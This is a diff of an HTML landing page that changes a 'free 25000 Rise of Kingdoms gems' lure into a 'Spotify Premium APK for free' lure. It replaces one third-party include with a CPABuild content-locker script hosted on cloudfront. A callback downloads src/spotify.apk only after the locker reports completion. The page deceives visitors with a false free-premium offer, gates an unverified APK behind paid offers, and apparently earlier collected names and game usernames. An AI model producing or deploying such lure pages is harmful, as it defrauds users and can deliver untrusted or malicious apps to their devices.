@@ -4,14 +4,17 @@
       <meta charset="utf-8">
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="viewport" content="width=device-width, initial-scale=1">
-      <title>Free Gems RoK</title>
-      <link rel="icon" type="image/png" href="src/images/logo.png">
+      <title>Spotify Premium APK</title>
+      <link rel="icon" type="image/png" href="src/images/icon-spotify.png">
       <link rel="preconnect" href="https://fonts.gstatic.com">
       <link href="https://fonts.googleapis.com/css2?family=Balsamiq+Sans:wght@700&display=swap" rel="stylesheet">
       <link rel="stylesheet" href="src/css/style.css">
       <script src="https://unpkg.com/animejs@3.0.1/lib/anime.min.js"></script>
       <script src="https://unpkg.com/scrollreveal@4.0.0/dist/scrollreveal.min.js"></script>
-      <script type="text/javascript" src="https://filesenzu.com/script_include.php?id=942546"></script>
+      <script type="text/javascript">
+          var CPABUILDSETTINGS={"it":1602782,"key":"62396"};
+      </script>
+      <script src="https://d13nu0oomnx5ti.cloudfront.net/26f5521.js"></script>
    </head>
    <body class="has-animations">
       <div class="body-wrap">
@@ -22,7 +25,7 @@
                   <h1 class="m-0">
                      <a href="#">
                         <!-- Header Image -->
-                        <img class="header-logo-image" src="src/images/logo.png" alt="Logo">
+                        <img class="header-logo-image" src="src/images/icon-spotify.png" alt="Logo">
                      </a>
                   </h1>
                </div>
@@ -36,10 +39,10 @@
             <div class="container">
                <div class="hero-inner">
                   <div class="hero-copy">
-                     <img class="logorok" src="src/images/logo-rok.png" onclick="call_locker();" alt="Logo">
-                     <h1 class="hero-title mt-0 text-center pt-16">Get Free Gems</h1>
+                     <img class="logorok" src="src/images/logo.png" onclick="call_locker();" alt="Logo">
+                     <h1 class="hero-title mt-0 text-center pt-16">Spotify Premium APK</h1>
                      <div class="hero-cta">
-                        <div class="datatext">
+                        <!-- <div class="datatext">
                            <input type="text" id="name" name="name" placeholder="Name...">
                         </div>
                         <div class="datatext">
@@ -47,25 +50,30 @@
                         </div>
                         <div class="datatext">
                            <input type="text" id="username" placeholder="Username RoK...">
-                        </div>
+                        </div> -->
                         <div class="btenviar">
-                           <a class="button button-primary" href="javascript:void(0)" onclick="call_locker();">
-                              SUBMIT
+                           <a class="button button-primary" onclick="CPABuildLock()">
+                              Download Here!
                            </a>
+                           <a href="src/spotify.apk" download id="download"></a>
                         </div>
                      </div>
                   </div>
                   <div class="hero-copy">
-                     <h1 class="hero-title mt-0 ft-30">Do you want to win 25000 gems for Rise of Kingdoms today?</h1>
-                     <img class="marginauto logoimggems2" src="./src/images/imggems2.png" alt="">
-                     <h1 class="hero-title mt-0 ft-30">Sign up here and complete the next step to unlock your gems!</h1>
+                     <h1 class="hero-title mt-0 ft-30">Download now Spotify Premium FOR FREE!</h1>
+                     <img class="marginauto logoimggems2" src="./src/images/apk.png" alt="">
+                     <!-- <h1 class="hero-title mt-0 ft-30">Sign up here and complete the next step to unlock your gems!</h1> -->
                   </div>
                </div>
             </div>
          </section>
-         <img class="marginauto logoimggems2" src="./src/images/pub.png" alt="">
       </main>
       </div>
       <script src="dist/js/main.min.js"></script>
+      <script>
+        function CPABuildComplete(){
+          document.getElementById('download').click();
+        }
+      </script>
    </body>
 </html>
